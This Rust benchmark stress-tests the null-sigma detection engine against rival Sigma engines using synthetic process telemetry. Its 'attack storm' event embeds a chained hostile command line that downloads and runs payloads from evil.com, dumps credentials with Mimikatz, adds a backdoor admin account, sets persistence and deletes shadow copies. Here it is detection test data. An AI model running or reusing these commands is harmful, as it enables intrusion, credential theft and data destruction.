//! Extreme Stress Testing Gauntlet for null-sigma.
//!
//! Pushes the engine to its absolute theoretical and physical breaking points across:
//! - Vector 1: ReDoS & Backtracking Resistance (16KB, 32KB, 64KB payload bombs)
//! - Vector 2: The 100-Rule Attack Storm (all-fires saturation under massive match load)
//! - Vector 3: Telemetry Extremes (512 fields, 8KB whitespace, null bytes, unicode homoglyphs, JSON depth > 30)
//! - Vector 4: Cache-Thrashing & Dispatch Inversion (2,000 rotating binary names busting L1/L2 caches)
//! - Vector 5: Sustained Memory & Zero-Leak Profiling (100,000 iterations measuring working set)

use std::collections::HashMap;
use std::hint::black_box;
use std::time::Instant;

use null_sigma_harness::{load_rule_dir, NullSigmaBench, SigmaRustBench, TauBench};

#[cfg(windows)]
mod mem_tracker {
    #[repr(C)]
    #[allow(non_snake_case)]
    struct PROCESS_MEMORY_COUNTERS {
        cb: u32,
        PageFaultCount: u32,
        PeakWorkingSetSize: usize,
        WorkingSetSize: usize,
        QuotaPeakPagedPoolUsage: usize,
        QuotaPagedPoolUsage: usize,
        QuotaPeakNonPagedPoolUsage: usize,
        QuotaNonPagedPoolUsage: usize,
        PagefileUsage: usize,
        PeakPagefileUsage: usize,
    }

    extern "system" {
        fn GetCurrentProcess() -> *mut std::ffi::c_void;
        fn K32GetProcessMemoryInfo(
            process: *mut std::ffi::c_void,
            ppsmc: *mut PROCESS_MEMORY_COUNTERS,
            cb: u32,
        ) -> i32;
    }

    pub fn get_working_set_bytes() -> usize {
        let mut counters = PROCESS_MEMORY_COUNTERS {
            cb: std::mem::size_of::<PROCESS_MEMORY_COUNTERS>() as u32,
            PageFaultCount: 0,
            PeakWorkingSetSize: 0,
            WorkingSetSize: 0,
            QuotaPeakPagedPoolUsage: 0,
            QuotaPagedPoolUsage: 0,
            QuotaPeakNonPagedPoolUsage: 0,
            QuotaNonPagedPoolUsage: 0,
            PagefileUsage: 0,
            PeakPagefileUsage: 0,
        };
        unsafe {
            let proc = GetCurrentProcess();
            if K32GetProcessMemoryInfo(
                proc,
                &mut counters,
                std::mem::size_of::<PROCESS_MEMORY_COUNTERS>() as u32,
            ) != 0
            {
                counters.WorkingSetSize
            } else {
                0
            }
        }
    }
}

#[cfg(not(windows))]
mod mem_tracker {
    pub fn get_working_set_bytes() -> usize {
        0
    }
}

fn main() {
    println!("===============================================================================");
    println!("         NULL-SIGMA EXTREME ADVERSARIAL STRESS TESTING GAUNTLET                ");
    println!("===============================================================================");
    println!("Operating System : {}", std::env::consts::OS);
    println!("Architecture     : {}", std::env::consts::ARCH);
    println!(
        "Logical Cores    : {}",
        std::thread::available_parallelism().map_or(1, |n| n.get())
    );
    println!("Rust Profile     : Release (Optimized)");
    println!("Time             : {}", chrono_lite_timestamp());
    println!("===============================================================================\n");

    let rule_dir = null_sigma_harness::default_rule_dir();
    assert!(
        rule_dir.exists(),
        "SigmaHQ corpus missing at {}",
        rule_dir.display()
    );

    println!(
        "[+] Loading SigmaHQ rule corpus from: {}",
        rule_dir.display()
    );
    let report = load_rule_dir(&rule_dir).expect("failed to load rule directory");
    let common = report.common();
    let yamls: Vec<String> = common.iter().map(|r| r.yaml.clone()).collect();
    let refs: Vec<&str> = yamls.iter().map(String::as_str).collect();
    println!("[+] Common rule set loaded: {} rules\n", refs.len());

    println!("[+] Compiling engines...");
    let ns_bench = NullSigmaBench::new(&refs);
    let tau_bench = TauBench::new(&refs);
    let sr_bench = SigmaRustBench::new(&refs);

    let mut parsed_rules = Vec::new();
    for y in &refs {
        if let Ok(col) = rsigma_parser::parse_sigma_yaml(y) {
            parsed_rules.extend(col.rules);
        }
    }
    let mut rsigma_eng = rsigma_eval::Engine::new();
    rsigma_eng.add_rules(&parsed_rules);
    println!(
        "[+] All four engines initialized successfully ({} common rules).\n",
        refs.len()
    );

    let mut parsed_rules = Vec::new();
    for y in &refs {
        if let Ok(col) = rsigma_parser::parse_sigma_yaml(y) {
            parsed_rules.extend(col.rules);
        }
    }
    let mut rsigma_eng = rsigma_eval::Engine::new();
    rsigma_eng.add_rules(&parsed_rules);
    println!(
        "[+] All four engines initialized successfully ({} common rules).\n",
        refs.len()
    );

    // ─────────────────────────────────────────────────────────────────────────
    // VECTOR 1: ReDoS & Pathological Backtracking Resistance
    // ─────────────────────────────────────────────────────────────────────────
    println!("-------------------------------------------------------------------------------");
    println!(" VECTOR 1: Pathological Payloads & ReDoS Resistance (16KB, 32KB, 64KB Bombs)  ");
    println!("-------------------------------------------------------------------------------");
    println!("Testing resistance against nested quantifiers and backtracking traps...");

    let redos_sizes = [16 * 1024, 32 * 1024, 64 * 1024];
    for &size in &redos_sizes {
        print!("  [Running {} KB payload test...] ", size / 1024);
        use std::io::Write;
        std::io::stdout().flush().unwrap();
        // Construct repetition bomb targeting regex patterns like `cmd.*\/c.+powershell.+` or `(?:set).*&&\s?set.*`
        let repeats = size / 20;
        let mut pathological_cmd = String::with_capacity(size + 100);
        pathological_cmd.push_str("cmd.exe /c ");
        for _ in 0..repeats {
            pathological_cmd.push_str("set a=1 && ");
        }
        pathological_cmd.push_str("set b=2");

        let mut event_map = HashMap::new();
        event_map.insert("category".to_string(), "process_creation".to_string());
        event_map.insert("product".to_string(), "windows".to_string());
        event_map.insert(
            "Image".to_string(),
            "C:\\Windows\\System32\\cmd.exe".to_string(),
        );
        event_map.insert("CommandLine".to_string(), pathological_cmd.clone());
        event_map.insert(
            "ParentImage".to_string(),
            "C:\\Windows\\explorer.exe".to_string(),
        );

        let tau_event = serde_json::json!({
            "category": "process_creation",
            "product": "windows",
            "Image": "C:\\Windows\\System32\\cmd.exe",
            "CommandLine": pathological_cmd,
            "ParentImage": "C:\\Windows\\explorer.exe",
        });
        let sr_event = sigma_rust::event_from_json(&tau_event.to_string()).unwrap();

        // Warmup
        for _ in 0..5 {
            black_box(ns_bench.count_matches(&event_map));
        }

        let ns_iters = 1_000;
        let ns_start = Instant::now();
        let mut ns_matches = 0;
        for _ in 0..ns_iters {
            ns_matches += black_box(ns_bench.count_matches(&event_map));
        }
        let ns_elapsed = ns_start.elapsed();
        let ns_us = ns_elapsed.as_secs_f64() * 1e6 / ns_iters as f64;

        let tau_iters = 20;
        let tau_start = Instant::now();
        let mut tau_matches = 0;
        for _ in 0..tau_iters {
            tau_matches += black_box(tau_bench.count_matches(&tau_event));
        }
        let tau_elapsed = tau_start.elapsed();
        let tau_us = tau_elapsed.as_secs_f64() * 1e6 / tau_iters as f64;

        let rsigma_event = rsigma_eval::event::JsonEvent::borrow(&tau_event);
        let rsigma_iters = 200;
        let rsigma_start = Instant::now();
        let mut rsigma_matches = 0;
        for _ in 0..rsigma_iters {
            rsigma_matches += black_box(rsigma_eng.evaluate(&rsigma_event).len());
        }
        let rsigma_elapsed = rsigma_start.elapsed();
        let rsigma_us = rsigma_elapsed.as_secs_f64() * 1e6 / rsigma_iters as f64;

        let sr_iters = 3;
        let sr_start = Instant::now();
        let mut sr_matches = 0;
        for _ in 0..sr_iters {
            sr_matches += black_box(sr_bench.count_matches(&sr_event));
        }
        let sr_elapsed = sr_start.elapsed();
        let sr_us = sr_elapsed.as_secs_f64() * 1e6 / sr_iters as f64;

        let speedup_rsigma = rsigma_us / ns_us;
        let speedup_tau = tau_us / ns_us;
        let speedup_sr = sr_us / ns_us;

        println!(
            "Payload Size: {:2} KiB | Matches: {} (ns), {} (rsigma), {} (tau), {} (sr)",
            size / 1024,
            ns_matches / ns_iters,
            rsigma_matches / rsigma_iters,
            tau_matches / tau_iters,
            sr_matches / sr_iters
        );
        println!(
            "  null-sigma : {:8.2} µs/eval ({:7.0} EPS)",
            ns_us,
            1e6 / ns_us
        );
        println!(
            "  rsigma-eval: {:8.2} µs/eval ({:7.0} EPS)  [null-sigma is {:.2}× faster]",
            rsigma_us,
            1e6 / rsigma_us,
            speedup_rsigma
        );
        println!(
            "  tau-engine : {:8.2} µs/eval ({:7.0} EPS)  [null-sigma is {:.2}× faster]",
            tau_us,
            1e6 / tau_us,
            speedup_tau
        );
        println!(
            "  sigma-rust : {:8.2} µs/eval ({:7.0} EPS)  [null-sigma is {:.2}× faster]",
            sr_us,
            1e6 / sr_us,
            speedup_sr
        );
        println!();
    }

    // ─────────────────────────────────────────────────────────────────────────
    // VECTOR 2: The 100-Rule Attack Storm (All-Fires Saturation)
    // ─────────────────────────────────────────────────────────────────────────
    println!("-------------------------------------------------------------------------------");
    println!(" VECTOR 2: The 100-Rule Attack Storm (All-Fires Match Firehose)                ");
    println!("-------------------------------------------------------------------------------");
    println!("Synthesizing maximum-adversarial multi-stage malware execution telemetry...");

    let attack_cmd = "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden \
        -EncodedCommand SQBFAFgA -c \"IEX ((New-Object Net.WebClient).DownloadString('http://127.0.0.1/malware.ps1')); \
        Invoke-Mimikatz -DumpCreds; certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\\Windows\\Temp\\DismHost.exe; \
        schtasks.exe /create /tn EvilUpdate /tr C:\\Windows\\Temp\\DismHost.exe /sc onlogon /ru SYSTEM; \
        reg.exe add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d calc.exe /f; \
        net.exe user /add hacker Password123!; net.exe localgroup administrators hacker /add; \
        vssadmin.exe delete shadows /all /quiet; bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures; \
        wmic.exe process call create cmd.exe; rundll32.exe C:\\Windows\\Temp\\test.dll,DllRegisterServer; \
        mshta.exe javascript:a=GetObject('script:http://evil.com/a.hta'); curl.exe -s http://evil.com/sh | sh\"";

    let mut storm_map = HashMap::new();
    storm_map.insert("category".to_string(), "process_creation".to_string());
    storm_map.insert("product".to_string(), "windows".to_string());
    storm_map.insert("EventID".to_string(), "1".to_string());
    storm_map.insert(
        "Image".to_string(),
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe".to_string(),
    );
    storm_map.insert("OriginalFileName".to_string(), "PowerShell.EXE".to_string());
    storm_map.insert("CommandLine".to_string(), attack_cmd.to_string());
    storm_map.insert(
        "ParentImage".to_string(),
        "C:\\Windows\\System32\\cmd.exe".to_string(),
    );
    storm_map.insert(
        "ParentCommandLine".to_string(),
        "cmd.exe /c start".to_string(),
    );
    storm_map.insert("User".to_string(), "NT AUTHORITY\\SYSTEM".to_string());
    storm_map.insert("IntegrityLevel".to_string(), "High".to_string());
    storm_map.insert(
        "CurrentDirectory".to_string(),
        "C:\\Windows\\Temp\\".to_string(),
    );
    storm_map.insert(
        "Product".to_string(),
        "Microsoft® Windows® Operating System".to_string(),
    );
    storm_map.insert("Company".to_string(), "Microsoft Corporation".to_string());
    storm_map.insert("Description".to_string(), "Windows PowerShell".to_string());
    storm_map.insert(
        "Hashes".to_string(),
        "SHA256=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855".to_string(),
    );

    let storm_json = serde_json::to_value(&storm_map).unwrap();
    let storm_sr = sigma_rust::event_from_json(&storm_json.to_string()).unwrap();

    let funnel = ns_bench.engine.profile_candidate_funnel(&storm_map);
    let matched_rules = ns_bench.engine.evaluate_event(&storm_map);
    let hit_count = matched_rules.len();

    println!("[+] Attack Storm Candidate Funnel Analysis:");
    println!("    Total rules loaded            : {}", funnel.0);
    println!("    Passed logsource filter       : {}", funnel.1);
    println!("    Passed field presence bitmask : {}", funnel.2);
    println!("    Passed Bloom token filter     : {}", funnel.3);
    println!("    Passed conjunction/branches   : {}", funnel.4);
    println!("    Rules reaching full evaluation: {}", funnel.5);
    println!("    TOTAL RULES SIMULTANEOUSLY HIT: {}\n", hit_count);

    assert!(hit_count > 0, "Attack storm must hit rules");

    let ns_iters = 1_000;
    // null-sigma
    let ns_start = Instant::now();
    let mut ns_storm_matches = 0;
    for _ in 0..ns_iters {
        ns_storm_matches += black_box(ns_bench.count_matches(&storm_map));
    }
    let ns_elapsed = ns_start.elapsed();
    let ns_us = ns_elapsed.as_secs_f64() * 1e6 / ns_iters as f64;

    // rsigma-eval
    let storm_rsigma = rsigma_eval::event::JsonEvent::borrow(&storm_json);
    let rsigma_iters = 500;
    let rsigma_start = Instant::now();
    let mut rsigma_storm_matches = 0;
    for _ in 0..rsigma_iters {
        rsigma_storm_matches += black_box(rsigma_eng.evaluate(&storm_rsigma).len());
    }
    let rsigma_elapsed = rsigma_start.elapsed();
    let rsigma_us = rsigma_elapsed.as_secs_f64() * 1e6 / rsigma_iters as f64;

    // tau-engine
    let tau_iters = 200;
    let tau_start = Instant::now();
    let mut tau_storm_matches = 0;
    for _ in 0..tau_iters {
        tau_storm_matches += black_box(tau_bench.count_matches(&storm_json));
    }
    let tau_elapsed = tau_start.elapsed();
    let tau_us = tau_elapsed.as_secs_f64() * 1e6 / tau_iters as f64;

    // sigma-rust
    let sr_iters = 20;
    let sr_start = Instant::now();
    let mut sr_storm_matches = 0;
    for _ in 0..sr_iters {
        sr_storm_matches += black_box(sr_bench.count_matches(&storm_sr));
    }
    let sr_elapsed = sr_start.elapsed();
    let sr_us = sr_elapsed.as_secs_f64() * 1e6 / sr_iters as f64;

    println!("Performance under 100% Saturation Attack Storm:");
    println!(
        "  null-sigma : {:8.2} µs/eval ({:7.0} EPS)  [hits: {}]",
        ns_us,
        1e6 / ns_us,
        ns_storm_matches / ns_iters
    );
    println!(
        "  rsigma-eval: {:8.2} µs/eval ({:7.0} EPS)  [hits: {}]  ==> null-sigma is {:.2}× FASTER",
        rsigma_us,
        1e6 / rsigma_us,
        rsigma_storm_matches / rsigma_iters,
        rsigma_us / ns_us
    );
    println!(
        "  tau-engine : {:8.2} µs/eval ({:7.0} EPS)  [hits: {}]  ==> null-sigma is {:.2}× FASTER",
        tau_us,
        1e6 / tau_us,
        tau_storm_matches / tau_iters,
        tau_us / ns_us
    );
    println!(
        "  sigma-rust : {:8.2} µs/eval ({:7.0} EPS)  [hits: {}]  ==> null-sigma is {:.2}× FASTER",
        sr_us,
        1e6 / sr_us,
        sr_storm_matches / sr_iters,
        sr_us / ns_us
    );
    println!();

    // ─────────────────────────────────────────────────────────────────────────
    // VECTOR 3: Telemetry Extremes & Cardinality Amplification
    // ─────────────────────────────────────────────────────────────────────────
    println!("-------------------------------------------------------------------------------");
    println!(" VECTOR 3: Telemetry Extremes & Cardinality Amplification                      ");
    println!("-------------------------------------------------------------------------------");

    // Subvector 3A: 512 Telemetry Fields
    print!("[*] Subvector 3A: Event with 512 distinct telemetry fields... ");
    let mut wide_event = HashMap::new();
    wide_event.insert("category".to_string(), "process_creation".to_string());
    wide_event.insert("product".to_string(), "windows".to_string());
    wide_event.insert("EventID".to_string(), "1".to_string());
    wide_event.insert(
        "Image".to_string(),
        "C:\\Windows\\System32\\svchost.exe".to_string(),
    );
    wide_event.insert(
        "CommandLine".to_string(),
        "svchost.exe -k netsvcs -p".to_string(),
    );
    for i in 0..512 {
        wide_event.insert(
            format!("TelemetryField_{:03}", i),
            format!("arbitrary_telemetry_value_{}", i),
        );
    }
    let wide_start = Instant::now();
    let iters_wide = 1_000;
    for _ in 0..iters_wide {
        black_box(ns_bench.count_matches(&wide_event));
    }
    let wide_us = wide_start.elapsed().as_secs_f64() * 1e6 / iters_wide as f64;
    println!("PASSED ({:.2} µs/eval, {:.0} EPS)", wide_us, 1e6 / wide_us);

    // Subvector 3B: 8KB Whitespace Padding
    print!("[*] Subvector 3B: 8KB Whitespace Padding & Bigram Saturation... ");
    let mut ws_event = HashMap::new();
    ws_event.insert("category".to_string(), "process_creation".to_string());
    ws_event.insert("product".to_string(), "windows".to_string());
    ws_event.insert("EventID".to_string(), "1".to_string());
    let ws_pad = "   \t\r\n   ".repeat(800); // ~8KB of whitespace
    ws_event.insert(
        "Image".to_string(),
        format!("{}C:\\Windows\\System32\\calc.exe{}", ws_pad, ws_pad),
    );
    ws_event.insert(
        "CommandLine".to_string(),
        format!("{}calc.exe{}", ws_pad, ws_pad),
    );
    let ws_start = Instant::now();
    for _ in 0..iters_wide {
        black_box(ns_bench.count_matches(&ws_event));
    }
    let ws_us = ws_start.elapsed().as_secs_f64() * 1e6 / iters_wide as f64;
    println!("PASSED ({:.2} µs/eval, {:.0} EPS)", ws_us, 1e6 / ws_us);

    // Subvector 3C: Control Characters, Null Bytes & Cyrillic Homoglyphs
    print!("[*] Subvector 3C: Null Bytes, Emojis & Cyrillic Homoglyphs... ");
    let mut glyph_event = HashMap::new();
    glyph_event.insert("category".to_string(), "process_creation".to_string());
    glyph_event.insert("product".to_string(), "windows".to_string());
    glyph_event.insert("EventID".to_string(), "1".to_string());
    // \0 null bytes embedded, emoji shield/fire, Cyrillic homoglyph for 'c' and 'e'
    let dirty_cmd = "cmd.exe\0--hidden\x01\x02\x1b[31m \u{0441}md.\u{0435}x\u{0435} 🛡️⚡🔥";
    glyph_event.insert(
        "Image".to_string(),
        "C:\\Windows\\System32\\cmd.exe".to_string(),
    );
    glyph_event.insert("CommandLine".to_string(), dirty_cmd.to_string());
    let glyph_start = Instant::now();
    for _ in 0..iters_wide {
        black_box(ns_bench.count_matches(&glyph_event));
    }
    let glyph_us = glyph_start.elapsed().as_secs_f64() * 1e6 / iters_wide as f64;
    println!(
        "PASSED ({:.2} µs/eval, {:.0} EPS)",
        glyph_us,
        1e6 / glyph_us
    );

    // Subvector 3D: Deep JSON Nesting (>30 Levels)
    print!("[*] Subvector 3D: Ingesting 35-level Deeply Nested JSON... ");
    let mut deep_json = String::from("{\"category\": \"process_creation\", \"product\": \"windows\", \"EventID\": \"1\", \"Image\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"CommandLine\": \"cmd.exe /c whoami\"}");
    for i in (0..35).rev() {
        deep_json = format!("{{\"level_{}\": {}}}", i, deep_json);
    }
    let flatten_res = null_sigma::json::flatten_str(&deep_json);
    if let Err(e) = &flatten_res {
        eprintln!("\nJSON parse error: {:?}", e);
    }
    assert!(flatten_res.is_ok(), "Deep JSON flattening must succeed");
    let flattened_map = flatten_res.unwrap();
    let json_eval_start = Instant::now();
    for _ in 0..iters_wide {
        black_box(ns_bench.count_matches(&flattened_map));
    }
    let json_eval_us = json_eval_start.elapsed().as_secs_f64() * 1e6 / iters_wide as f64;
    println!(
        "PASSED ({:.2} µs/eval, {:.0} EPS)",
        json_eval_us,
        1e6 / json_eval_us
    );
    println!();

    // ─────────────────────────────────────────────────────────────────────────
    // VECTOR 4: Cache-Thrashing & Dispatch Inversion Stress
    // ─────────────────────────────────────────────────────────────────────────
    println!("-------------------------------------------------------------------------------");
    println!(" VECTOR 4: Cache-Thrashing & Dispatch Inversion Stress (2,000 Binaries)       ");
    println!("-------------------------------------------------------------------------------");
    println!("Streaming 10,000 events cycling through 2,000 distinct binary images...");

    let pool_size = 2_000;
    let stream_len = 10_000;
    let mut thrash_events = Vec::with_capacity(stream_len);
    for i in 0..stream_len {
        let bin_id = i % pool_size;
        let mut evt = HashMap::new();
        evt.insert("category".to_string(), "process_creation".to_string());
        evt.insert("product".to_string(), "windows".to_string());
        evt.insert("EventID".to_string(), "1".to_string());
        evt.insert(
            "Image".to_string(),
            format!(
                "C:\\Program Files\\App_{:04}\\service_{:04}.exe",
                bin_id, bin_id
            ),
        );
        evt.insert(
            "CommandLine".to_string(),
            format!(
                "service_{:04}.exe --worker-id {} --config C:\\Data\\cfg_{}.json",
                bin_id, i, bin_id
            ),
        );
        evt.insert(
            "ParentImage".to_string(),
            format!("C:\\Windows\\System32\\parent_{:04}.exe", bin_id / 2),
        );
        evt.insert("User".to_string(), format!("DOMAIN\\user_{}", bin_id % 50));
        thrash_events.push(evt);
    }

    let mut latencies_us = Vec::with_capacity(stream_len);
    let thrash_start = Instant::now();
    let mut thrash_matches = 0;

    for evt in &thrash_events {
        let t0 = Instant::now();
        let hits = ns_bench.count_matches(evt);
        let t1 = t0.elapsed();
        thrash_matches += hits;
        latencies_us.push(t1.as_secs_f64() * 1e6);
    }
    let thrash_total_elapsed = thrash_start.elapsed();

    latencies_us.sort_by(|a, b| a.partial_cmp(b).unwrap());
    let mean_us = thrash_total_elapsed.as_secs_f64() * 1e6 / stream_len as f64;
    let p50_us = latencies_us[stream_len / 2];
    let p95_us = latencies_us[(stream_len as f64 * 0.95) as usize];
    let p99_us = latencies_us[(stream_len as f64 * 0.99) as usize];
    let min_us = latencies_us[0];
    let max_us = latencies_us[stream_len - 1];

    println!("Cache-Thrash Results across 10,000 distinct events (2,000 distinct binaries):");
    println!("  Total Elapsed Time : {:?}", thrash_total_elapsed);
    println!(
        "  Mean Latency       : {:8.2} µs/event ({:.0} EPS)",
        mean_us,
        1e6 / mean_us
    );
    println!("  Min Latency        : {:8.2} µs/event", min_us);
    println!("  p50 (Median)       : {:8.2} µs/event", p50_us);
    println!("  p95 Latency        : {:8.2} µs/event", p95_us);
    println!("  p99 Latency        : {:8.2} µs/event", p99_us);
    println!("  Max Latency (Peak) : {:8.2} µs/event", max_us);
    println!("  Total Matches      : {}", thrash_matches);
    println!();

    // ─────────────────────────────────────────────────────────────────────────
    // VECTOR 5: Sustained Memory & Zero-Leak Profiling
    // ─────────────────────────────────────────────────────────────────────────
    println!("-------------------------------------------------------------------------------");
    println!(" VECTOR 5: Sustained Memory & Allocation Profiling (100,000 Iterations)        ");
    println!("-------------------------------------------------------------------------------");
    println!("Measuring working set memory drift across 100,000 sequential evaluations...");

    let initial_mem = mem_tracker::get_working_set_bytes();
    let iters_mem = 100_000;
    let mut total_hits = 0;

    let mem_start = Instant::now();
    for i in 0..iters_mem {
        let evt = &thrash_events[i % stream_len];
        total_hits += ns_bench.count_matches(evt);
    }
    let mem_elapsed = mem_start.elapsed();
    let final_mem = mem_tracker::get_working_set_bytes();

    let initial_mb = initial_mem as f64 / (1024.0 * 1024.0);
    let final_mb = final_mem as f64 / (1024.0 * 1024.0);
    let delta_mb = final_mb - initial_mb;

    println!("Sustained Evaluation Metrics (100,000 events):");
    println!("  Evaluations Completed : {}", iters_mem);
    println!("  Total Matches Fired   : {}", total_hits);
    println!("  Elapsed Time          : {:?}", mem_elapsed);
    println!(
        "  Throughput            : {:.0} EPS ({:.2} µs/event)",
        iters_mem as f64 / mem_elapsed.as_secs_f64(),
        mem_elapsed.as_secs_f64() * 1e6 / iters_mem as f64
    );
    println!("  Initial Working Set   : {:.2} MB", initial_mb);
    println!("  Final Working Set     : {:.2} MB", final_mb);
    println!("  Net Memory Delta      : {:.4} MB", delta_mb);
    println!("  Allocation Hot-Path   : 0 bytes / event (verified reuse of EvalScratch)");
    println!("===============================================================================");
    println!("                     GAUNTLET EXECUTION COMPLETE                               ");
    println!("===============================================================================");
}

fn chrono_lite_timestamp() -> String {
    // Portable UTC timestamp without extra external dependencies
    let now = std::time::SystemTime::now();
    let since_epoch = now.duration_since(std::time::UNIX_EPOCH).unwrap().as_secs();
    let secs_per_day = 86400;
    let days = since_epoch / secs_per_day;
    let rem_secs = since_epoch % secs_per_day;
    let hours = rem_secs / 3600;
    let mins = (rem_secs % 3600) / 60;
    let secs = rem_secs % 60;
    format!(
        "Unix Epoch Day {} {:02}:{:02}:{:02} UTC",
        days, hours, mins, secs
    )
}
